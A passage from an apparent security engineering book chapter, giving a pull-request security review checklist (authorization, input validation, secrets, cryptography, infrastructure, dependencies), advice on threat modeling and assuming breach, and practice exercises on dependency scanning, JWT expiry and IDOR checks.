- [ ] **Every endpoint checks authorization, not just authentication.** Verified the user is who they say they are (authn) AND that they're allowed to perform this action on this specific resource (authz).
- [ ] **Object-level authorization is checked server-side.** For any endpoint accepting a resource ID, the query is scoped to the current user's owned/accessible resources — not just a lookup by ID.
- [ ] **Admin endpoints are protected by an admin check, not just authentication.** Tested with a non-admin token to confirm a 403 is returned.
- [ ] **Privilege-sensitive fields are not user-writable.** `role`, `is_admin`, `account_balance`, `email_verified` are not accepted from user-supplied request bodies.

### Input Validation & Output Encoding

- [ ] **All database queries use parameterized queries or an ORM.** No string concatenation of user input into SQL. No `f"...WHERE id = {user_id}"`.
- [ ] **All user-supplied file paths are canonicalized and verified against an allowed base directory.** `realpath()` + prefix check before any file operation.
- [ ] **User-supplied content rendered in HTML is properly escaped.** No raw use of `innerHTML`, `v-html`, `dangerouslySetInnerHTML` with user data. DOMPurify is used if rich HTML is genuinely needed.
- [ ] **Content-Security-Policy header is set.** Inline scripts restricted or eliminated.
- [ ] **API responses do not leak sensitive internal data.** Error messages describe the error type (not found, invalid input) without stack traces, database field names, or internal structure.

### Secrets & Credentials

- [ ] **No secrets in the code.** No API keys, passwords, connection strings, or tokens in source files, Dockerfiles, scripts, or test fixtures.
- [ ] **No secrets in environment variable defaults that would be committed.** `.env.example` contains only placeholder values.
- [ ] **Secrets are fetched from a secrets manager at runtime, not at build time.** Application reads from Vault/Secrets Manager on startup, not from a baked-in build artifact.
- [ ] **New infrastructure secrets (DB credentials, API keys) are rotatable.** If a key is leaked, you can rotate it without downtime.

### Cryptography

- [ ] **Passwords are hashed with bcrypt, argon2id, or scrypt.** Not MD5, SHA-1, or SHA-256.
- [ ] **JWTs are validated with explicit algorithm specification.** Not using the algorithm from the token header. Expiry, issuer, and audience are checked.
- [ ] **Access tokens have short expiry (15-60 minutes).** Refresh tokens are rotated on use.
- [ ] **TLS is enforced.** No plaintext HTTP endpoints. HSTS header is set on HTTPS responses.

### Data Handling

- [ ] **Personal data collected is limited to what's actually needed.** No "might be useful later" fields.
- [ ] **Sensitive data is not logged.** Checked logs for passwords, tokens, SSNs, payment data, or full email addresses (depending on your data classification policy).
- [ ] **New external API calls are reviewed for what data is sent.** Third-party analytics, error tracking, logging services — ensure you're not sending PII that violates your DPA.
- [ ] **File uploads are validated for type (magic bytes, not extension) and size.** Uploaded files are not executed. Files are stored outside the web root.

### Infrastructure Changes

- [ ] **New IAM roles/policies follow least privilege.** No `*` resources or actions where specific ones can be named. Reviewed with a fresh eye: "what's the worst case if this role is compromised?"
- [ ] **New S3 buckets or storage resources have appropriate access controls.** Public access is explicitly considered and documented if enabled.
- [ ] **New network security group rules don't open unnecessary ports.** Database ports are not open to `0.0.0.0/0`.
- [ ] **New Docker images run as non-root.** Read-only root filesystem where possible.

### Dependencies

- [ ] **New dependencies are from active, reputable sources.** Checked for known CVEs (`npm audit`, `pip-audit`, `trivy`). Verified the package name is not a typosquat of a well-known package.
- [ ] **Lockfile is updated and committed.** `package-lock.json`, `Pipfile.lock`, `go.sum` — pinned to specific versions with hashes.
- [ ] **Deserialization of untrusted data uses safe formats only.** JSON with schema validation, not binary serialization formats applied to user input.

**How to use this checklist:** You don't need to work through every item for every PR. Calibrate to the PR. A PR that only changes copy doesn't need a cryptography review. A PR that adds a new API endpoint needs the auth, input validation, and data handling sections. A PR that changes dependency versions needs the dependency section. A PR that adds a file upload feature needs everything.

The goal is to make security review a natural part of the code review conversation, not a separate gating process. When a PR author can check these boxes themselves before requesting review, the review is faster and the issues caught are the subtle ones — not the basics.

---

## Putting It Together: The Security-First Mindset

Security is a practice, not a destination. The threat landscape evolves. New vulnerabilities are discovered. Your application changes. What was secure last year might not be secure next year.

The habits that separate secure engineers from insecure ones:

**Threat modeling.** Before building a new feature, spend 30 minutes asking: what are we trying to protect? Who might attack it? How? What are the consequences of each attack succeeding? This doesn't need to be formal. A whiteboard session with your team is enough. The goal is to surface assumptions and blind spots before you write code.

**Security as a test case.** For every feature, write tests that verify the security properties: unauthenticated requests are rejected, unauthorized users can't access other users' data, input validation works as expected. If the security properties aren't tested, they'll eventually regress.

**Stay current.** Follow the CVEs that affect your stack. Subscribe to security advisories from your cloud provider. When a critical vulnerability is announced (another Log4Shell will happen), you need to know within hours whether you're affected and have a plan to patch.

**Assume breach.** Design your systems assuming an attacker will eventually get in somewhere. The goal is to minimize the blast radius: segmentation so they can't move laterally, least privilege so they can't escalate, audit logs so you can detect and reconstruct, backups so you can recover.

The engineer who thinks "security is someone else's problem" is the one whose code causes the breach that makes the news. The engineer who internalizes these principles writes code that holds up under adversarial conditions.

That's what security engineering is: building systems that work correctly even when someone is actively trying to make them fail.

---

*Next up: [Ch 7: Infrastructure Security] goes deep on cloud security architecture, and [Ch 19: AWS IAM & Security] gets into the specifics of AWS permissions. If CI/CD security is your immediate concern, [Ch 15: CI/CD Security] covers securing your build and deployment pipelines.*

---

## Try It Yourself

Want to put this into practice? The [TicketPulse course](../course/) has hands-on modules that build on these concepts:

- **[L1-M13: Authentication & Authorization](../course/modules/loop-1/L1-M13-authentication-authorization.md)** — Implement JWT-based auth and RBAC for TicketPulse, including refresh token rotation and session management
- **[L1-M23: OWASP Top 10 — Finding Vulnerabilities](../course/modules/loop-1/L1-M23-owasp-top-10-finding-vulnerabilities.md)** — Work through each OWASP Top 10 category against TicketPulse's codebase and fix the findings
- **[L2-M56: Advanced Authentication — OAuth2 / OpenID Connect](../course/modules/loop-2/L2-M56-advanced-authentication.md)** — Add social login and third-party OAuth flows to TicketPulse using industry-standard protocols
- **[L3-M79: Data Privacy & GDPR](../course/modules/loop-3/L3-M79-data-privacy-gdpr.md)** — Implement data subject rights, consent management, and retention policies for TicketPulse's user data

### Quick Exercises

1. **Run a dependency vulnerability scan on your project** — use `npm audit`, `pip-audit`, `trivy`, or `grype` on your codebase right now. Count the high and critical findings and triage the top three.
2. **Check if your JWT tokens have appropriate expiry times** — find where your application issues JWTs and verify that access tokens expire in minutes-to-hours (not days), and that refresh tokens are properly rotated on use.
3. **Review one API endpoint for IDOR vulnerabilities** — pick an endpoint that accepts a resource ID in the URL or body (e.g., `/orders/123`). Verify that the server-side code checks that the authenticated user actually owns resource 123, not just that the user is authenticated.
